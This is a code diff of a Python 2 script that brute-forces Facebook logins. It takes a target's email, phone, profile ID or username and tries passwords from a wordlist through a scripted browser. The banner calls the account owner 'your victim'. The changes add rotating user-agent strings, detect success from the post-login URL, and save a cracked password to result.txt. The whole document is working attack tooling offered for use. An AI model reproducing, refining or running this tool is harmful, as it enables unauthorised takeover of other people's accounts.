@@ -10,7 +10,6 @@ import sys
 import random
 import mechanize
 import cookielib
-from bs4 import BeautifulSoup
 
 GHT = '''
         +=======================================+
@@ -37,7 +36,9 @@ print "# Use www.graph.facebook.com for more infos about your victim ^_^"
 email = str(raw_input("# Enter |Email| |Phone number| |Profile ID number| |Username| : "))
 passwordlist = str(raw_input("Enter the name of the password list file : "))
 
-useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
+useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
+                ('User-agent','Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36'),
+                ('User-agent','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9')]
 
 
 
@@ -57,15 +58,24 @@ def attack(password):
      br.form['pass'] = password
      rep = br.submit()
      log = br.geturl()
-     soup = BeautifulSoup(rep, 'html.parser')
-     toCheck = soup.find("div", {"class": "signupBanner"})
-     if (toCheck == None):
+     toCheck = login in log
+     if (not toCheck):
         print "\n\n\n [*] Password found .. !!"
         print "\n [*] Password : %s\n" % (password)
+        pwd = open("result.txt", "w")
+        pwd.write(password)
+        pwd.close
+        end  = 1
         sys.exit(1)
   except KeyboardInterrupt:
         print "\n[*] Exiting program .. "
         sys.exit(1)
+
+  except :
+        if end == 1:
+            sys.exit(1)
+        else:
+            pass
 
 def search():
     global password
@@ -78,6 +88,8 @@ def check():
 
     global br
     global passwords
+    global end
+    end = 0
     try:
        br = mechanize.Browser()
        cj = cookielib.LWPCookieJar()
